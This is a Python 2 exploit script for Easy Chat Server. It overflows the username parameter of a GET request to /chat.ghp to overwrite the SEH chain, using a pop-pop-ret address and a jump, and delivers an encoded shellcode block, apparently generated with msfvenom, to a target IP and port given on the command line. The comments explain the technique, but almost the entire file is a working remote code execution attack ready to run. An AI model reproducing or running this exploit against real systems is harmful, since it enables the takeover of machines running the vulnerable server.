#!/usr/bin/python

## NOTE: easy chat server uses port 80

import sys
import argparse
import socket

# This exploit will utilize seh and its mechanisms
# once an exception happens, the cpu will look for the responsible handler
# which we found in a non seh-safe module a dangerous sequence of pop pop retn 
# returns the esp+8 location which is the address back to our reponsible handler's record
# and the retrn will pop the said address into eip and therefore execute what we put in the overwrite
# we will jump the 2 no-op bytes and 4 byte address for the handler pointer (6 total bytes)
# it will hit a couple of no-op sleds and our payload 



# user input
program_description = "The program inputs ip and port of the victim pc"
parser = argparse.ArgumentParser(program_description)
parser.add_argument("target_ip", help="Target IP")
parser.add_argument("target_port", type=int, help="Target Port")
args = parser.parse_args()

# global parameters
user_input = (args.target_ip, args.target_port)


# function definitions
def buffer_gen():
    buf = 'GET /chat.ghp?username='

    # 216 is the offset of the seh chain current record's next record pointer in the stack, next 4 bytes is the handler pointer
    buf = buf + 'A' * 216
    
    # adding the exec instruction of jumping 6 bytes into lower mem 
    # the instruction is only 2 bytes, and we added two more no-op bytes
    # because it is not a memory location, but rather an exec instruction, no reverse order is required
    seh_nr_ptr = '\xEB\x06\x90\x90'
    buf = buf + seh_nr_ptr
    
    # adding the mem location of pop pop retn sequence commands for the se handler
    # this is a memory location, needs to be looked up by the cpu those we need to put it in reverse
    # to comply with endianess
    se_hndlr = '\xBC\x04\x01\x10'
    buf = buf +  se_hndlr

    # adding payload
    # bad characters for this exploit are 0x00 and 0x20
    # remember when using msfvenom to generate the payload, we have to 
    # specify the EXITFUNC=seh, since after our payload executes it 
    # needs to return control to the seh 
    buf += "\xb8\xbf\xb0\x0a\xbd\xdb\xd6\xd9\x74\x24\xf4\x5e\x31"
    buf += "\xc9\xb1\x4f\x83\xee\xfc\x31\x46\x0e\x03\xf9\xbe\xe8"
    buf += "\x48\xf9\x57\x6e\xb2\x01\xa8\x0f\x3a\xe4\x99\x0f\x58"
    buf += "\x6d\x89\xbf\x2a\x23\x26\x4b\x7e\xd7\xbd\x39\x57\xd8"
    buf += "\x76\xf7\x81\xd7\x87\xa4\xf2\x76\x04\xb7\x26\x58\x35"
    buf += "\x78\x3b\x99\x72\x65\xb6\xcb\x2b\xe1\x65\xfb\x58\xbf"
    buf += "\xb5\x70\x12\x51\xbe\x65\xe3\x50\xef\x38\x7f\x0b\x2f"
    buf += "\xbb\xac\x27\x66\xa3\xb1\x02\x30\x58\x01\xf8\xc3\x88"
    buf += "\x5b\x01\x6f\xf5\x53\xf0\x71\x32\x53\xeb\x07\x4a\xa7"
    buf += "\x96\x1f\x89\xd5\x4c\x95\x09\x7d\x06\x0d\xf5\x7f\xcb"
    buf += "\xc8\x7e\x73\xa0\x9f\xd8\x90\x37\x73\x53\xac\xbc\x72"
    buf += "\xb3\x24\x86\x50\x17\x6c\x5c\xf8\x0e\xc8\x33\x05\x50"
    buf += "\xb3\xec\xa3\x1b\x5e\xf8\xd9\x46\x37\xcd\xd3\x78\xc7"
    buf += "\x59\x63\x0b\xf5\xc6\xdf\x83\xb5\x8f\xf9\x54\xb9\xa5"
    buf += "\xbe\xca\x44\x46\xbf\xc3\x82\x12\xef\x7b\x22\x1b\x64"
    buf += "\x7b\xcb\xce\x11\x70\x6a\xa1\x07\x7b\xe6\x40\xa2\x81"
    buf += "\x9f\xa8\x3d\x5a\xbf\xd2\x97\xf3\x28\x2f\x18\xea\xf4"
    buf += "\xa6\xfe\x66\x15\xef\xa9\x1e\xd7\xd4\x61\xb9\x28\x3f"
    buf += "\x08\x85\xa2\x98\x44\x6d\xfa\xf0\x53\x92\xfb\xd6\xf3"
    buf += "\x04\x70\x35\xc0\x35\x87\x10\x60\x22\x10\xee\xe1\x01"
    buf += "\x80\xef\x2b\xf3\x42\x7a\xd0\x55\x14\x12\xda\x80\x52"
    buf += "\xbd\x25\xe7\xe0\xba\xda\x79\xca\xb1\xed\xef\x54\xae"
    buf += "\x11\xff\x54\x2e\x44\x95\x54\x46\x30\xcd\x06\x73\x3f"
    buf += "\xd8\x3a\x28\xaa\xe2\x6a\x9c\x7d\x8a\x90\xfb\x4a\x15"
    buf += "\x6a\x2e\xc9\x51\x94\xaf\xc9\xa0\x56\x66\x10\xd7\xb1"
    buf += "\xba\x27\xe9\x4c\x0f\xb2\x7f\x51\x3c\xbd\xaa\x3b\xc2"
    buf += "\x82"

    buf = buf + '&password=test&room=1&sex=2 HTTP/1.1\r\n\r\n'
    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
    s = socket_setup(input_tuple[0], input_tuple[1])
    buf = buffer_gen()

    print "sending buffer: ", buf
    s.send(buf)

    try:
#        recv = s.recv(1024)
#        print "server says: ", recv
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Exploit"
        s.close()
        sys.exit(0)         # gracefully exits upon ctrl-c

# script execution
if __name__ == "__main__":
    main(user_input)        # calling main function

